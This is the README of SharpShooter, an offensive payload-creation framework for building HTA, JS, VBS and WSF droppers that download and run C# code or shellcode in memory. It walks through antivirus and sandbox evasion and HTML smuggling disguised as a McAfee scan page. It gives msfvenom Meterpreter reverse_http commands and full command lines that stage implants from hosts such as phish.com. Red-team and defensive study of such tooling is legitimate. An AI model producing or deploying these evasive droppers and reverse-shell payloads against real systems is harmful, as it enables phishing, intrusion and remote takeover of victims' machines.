```
   _____ __                    _____ __                __           
  / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
  \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
 ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /    
/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     
                     /_/                                            

```

Description
===========

SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code.
SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS and WSF. It leverages James Forshaw's [DotNetToJavaScript](https://github.com/tyranid/DotNetToJScript) tool to invoke methods from the SharpShooter DotNet serialised object. Payloads can be retrieved using Web or DNS delivery or both; SharpShooter is compatible with the MDSec ActiveBreach PowerDNS project. Alternatively, stageless payloads with embedded shellcode execution can also be generated for the same scripting formats.

SharpShooter payloads are RC4 encrypted with a random key to provide some modest anti-virus evasion, and the project includes the capability to integrate sandbox detection and environment keying to assist in evading detection.

SharpShooter includes a predefined CSharp template for executing shellcode with staged and stageless payloads, but any CSharp code can be compiled and invoked in memory using reflection, courtesy of CSharp's CodeDom provider.

Finally, SharpShooter provides the ability to bundle the payload inside an HTML file using the [Demiguise HTML smuggling](https://github.com/nccgroup/demiguise) technique.

SharpShooter targets v2, v3 and v4 of the .NET framework which will be found on most end-user Windows workstations.

Further information can be found on the MDSec blog post.

Usage - Interactive Mode:
======

SharpShooter has both command line arguments and an interactive menu to configure and build the payload options, each of the menu prompts are described below.

```
[*] Which version of the .NET framework do you want to target?:
[1] v2
[2] v4 (OPSEC WARNING: Uses WScript.Shell)
```
The above menu determines the version of the .NET framework that you want to target. If you need to target v3.5 you should select the v2 option which is mostly compatible. You should be aware that v4 targeting uses WScript.Shell to execute the payload and as such is more at risk from EDR/monitoring and may not necessarily be considered totally OpSec safe.

```
[*] Do you want to create a staged payload? i.e. web/DNS delivery (Y/N)n
```
SharpShooter has the ability to create both staged and stageless artifacts. In the case of a staged payload, a CSharp file will be retrieved via either DNS or web, compiled and executed. In the case of a stageless payload, a raw shellcode file is read file the file system, base64 encoded and embedded in the generated payload. Currently stageless payloads do not support arbitrary CSharp execution but this is likely to be added in the future.


```
[*] Select the type of payload to generate:
[1] HTA
[2] JS
[3] JSE
[4] VBA
[5] VBE
[6] VBS
[7] WSF
```
The above menu selects the type of payload that you want to generate. Currently VBA is only partly supported, pending further development/research. The generated payload will be written to the "output" folder.

```
[*] The following anti-sandbox techniques are available:
[1] Key to Domain
[2] Ensure Domain Joined
[3] Check for Sandbox Artifacts
[4] Check for Bad MACs
[5] Check for Debugging
[0] Done
```

SharpShooter includes the ability to embed anti-sandbox defences in to the payload, these are predominantly taken from the [CheckPlease project](https://github.com/Arvanaghi/CheckPlease) with the exception of Domain Keying which allows you to limit your payload to running only on domain members from a target domain. More than one technique can be selected and if the conditions are met, such as the host not being domain joined (2), then the payload will not execute. The theory here is that if the sandbox does not see the bad behaviour, it will assume your payload to be safe.

```
[*] Select the delivery method for the staged payload:
[1] Web Delivery
[2] PowerDNS Delivery
[3] Both
```

This menu option details the method that will be used to perform staging and whether this happens using web delivery, DNS or both. During this process, the payload will retrieve the CSharp source code from the provided URL; the source code is gzip'd and base64 encoded.

```
[*] Do you want to use the builtin shellcode template? Y/N
```

SharpShooter contains a basic template for executing shellcode, here you can paste in a CSharp byte array of either your x86 or x64 shellcode.

On 64-bit systems you must use x64 shellcode for JS/JSE, VBS/VBE and WSF payloads; you can generate it using msfvenom similar to the following:

```
msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=172.16.164.203 LPORT=8080 EnableStageEncoding=True PrependMigrate=True -f csharp
```

For 32-bit or when handling HTA files, the shellcode must be x86 and can be generated as follows:

```
msfvenom -a x86 -p windows/meterpreter/reverse_http LHOST=172.16.164.203 LPORT=8080 EnableStageEncoding=True StageEncoder=x86/shikata_ga_nai -f csharp
```

When using web delivery, SharpShooter will prompt for the location where your CSharp payload is hosted:

```
[*] Provide URI for CSharp web delivery
```

Here you should provide the URL to where you've hosted the output.payload file. If you're using DNS delivery, you should provide the staging host where PowerDNS is running. It should be noted that SharpShooter will fallback to DNS delivery if web delivery fails, for example should your user not be able to make web requests in your target environment.

```
[*] Do you want to smuggle inside HTML?
```

When SharpShooter prompts as above, it offers the ability to perform a HTML smuggling attack. This will take the previously generated SharpShooter payload and embed it inside a HTML file, rc4 encrypted and retrievable via most modern browsers. This file can be useful for bypassing certain proxy restrictions such as MIME type or extension blocking, or submiting the payload via e-mail as HTML is a permitted attachment in most mail clients.
SharpShooter contains 2 pre-defined templates; it is recommended you create a custom template using these as an example.

Usage - Command Line Mode:
======

SharpShooter is highly configurable, supporting a number of different payload types, sandbox evasions, delivery methods and output types.

Running SharpShooter with the --help argument will produce the following output:

```
usage: SharpShooter.py [-h] [--interactive] [--stageless] [--dotnetver <ver>]
                       [--payload <format>] [--sandbox <types>]
                       [--delivery <type>] [--rawscfile <path>] [--shellcode]
                       [--scfile <path>] [--refs <refs>] [--namespace <ns>]
                       [--entrypoint <ep>] [--web <web>] [--dns <dns>]
                       [--output <output>] [--smuggle] [--template <tpl>]

optional arguments:
  -h, --help          show this help message and exit
  --interactive       Use the interactive menu
  --stageless         Create a stageless payload
  --dotnetver <ver>   Target .NET Version: 2 or 4
  --payload <format>  Payload type: hta, js, jse, vba, vbe, vbs, wsf
  --sandbox <types>   Anti-sandbox techniques:
                      [1] Key to Domain (e.g. 1=CONTOSO)
                      [2] Ensure Domain Joined
                      [3] Check for Sandbox Artifacts
                      [4] Check for Bad MACs
                      [5] Check for Debugging
  --delivery <type>   Delivery method: web, dns, both
  --rawscfile <path>  Path to raw shellcode file for stageless payloads
  --shellcode         Use built in shellcode execution
  --scfile <path>     Path to shellcode file as CSharp byte array
  --refs <refs>       References required to compile custom CSharp,
                      e.g. mscorlib.dll,System.Windows.Forms.dll
  --namespace <ns>    Namespace for custom CSharp,
                      e.g. Foo.bar
  --entrypoint <ep>   Method to execute,
                      e.g. Main
  --web <web>         URI for web delivery
  --dns <dns>         Domain for DNS delivery
  --output <output>   Name of output file (e.g. maldoc)
  --smuggle           Smuggle file inside HTML
  --template <tpl>    Name of template file (e.g. mcafee)
  ```

Examples of some use cases are provided below:

### Stageless JavaScript ###

```
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
```

Create a stageless JavaScript payload targeting version 4 of the .NET framework. This example will create a payload named foo.js in the output directory. The shellcode is read from the ./raw.txt file.
The payload attempts to enforce some sandbox evasion by keying execution to the CONTOSO domain, and checking for known sandbox/VM artifacts.

### Stageless HTA ###

```
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
```

Create a stageless HTA payload targeting version 2/3 of the .NET framework. This example will create a payload named foo.hta in the output directory. The shellcode is read from the ./raw.txt file.
The payload attempts to enforce some sandbox evasion by checking for known virtual MAC addresses. A HTML smuggling payload will also be generated named foo.html in the output directory. This payload will use the example McAfee virus scan template.

### Staged VBS ###

```
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
```

This example creates a staged VBS payload that performs both Web and DNS delivery. The payload will attempt to retrieve a GZipped CSharp file that executes the shellcode supplied as a CSharp byte array in the csharpsc.txt file. The CSharp file used is the built-in SharpShooter shellcode execution template. The payload is created in the output directory named foo.payload and should be hosted on http://www.foo.bar/shellcode.payload. The same file should also be hosted on the bar.foo domain using PowerDNS to serve it. The VBS file will attempt to key execution to the CONTOSO domain and will be embedded in a HTML file using the HTML smuggling technique with the McAfee virus scanned template. The resultant payload is stored in the output directory named foo.html.

### Custom CSharp inside VBS ###

```
SharpShooter.py --dotnetver 2 --payload js --sandbox 2,3,4,5 --delivery web --refs mscorlib.dll,System.Windows.Forms.dll --namespace MDSec.SharpShooter --entrypoint Main --web http://www.phish.com/implant.payload --output malicious --smuggle --template mcafee
```

This example demonstrates how to create a staged JS payload that performs web delivery, retrieving a payload from http://www.phish.com/implant.payload. The generated payload will attempt sandbox evasion, and attempt to compile the retrieved payload which requires mscorlib.dll and System.Windows.Forms.dll as DLL references. The Main method in the MDSec.SharpShooter namespace will be executed on successful compilation. 

Author and Credits
==================
Author: Dominic Chell, MDSec ActiveBreach [@domchell](https://twitter.com/domchell) and [@mdseclabs](https://twitter.com/mdseclabs)

Credits:
- [@tiraniddo](https://twitter.com/tiraniddo): James Forshaw for DotNetToJScript
- [@Arno0x0x](https://twitter.com/Arno0x0x): for EmbedInHTML
- [@buffaloverflow](https://twitter.com/buffaloverflow): Rich Warren for Demiguise
- [@arvanaghi](https://twitter.com/arvanaghi) and [@ChrisTruncer](https://twitter.com/ChrisTruncer): Brandon Arvanaghi and Chris Truncer for CheckPlease